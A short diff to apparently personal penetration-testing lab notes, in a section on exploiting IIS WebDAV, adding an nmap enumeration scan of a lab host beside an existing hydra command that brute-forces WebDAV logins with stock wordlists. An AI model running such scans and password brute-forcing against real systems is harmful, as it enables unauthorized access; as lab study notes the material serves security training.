@@ -992,6 +992,10 @@ exploit
 
 #### Exploiting Microsoft IIA WebDAV:
 
+```shell
+nmap --script http-enum -sV -p 80 demo.ine.local
+```
+> check the webdev
 ```Shell
 hydra -L /usr/share/metasploit/common_user.txt -P /usr/share/metasploit/common_passwords.txt <ip-address> http-get /webdav/
 ```
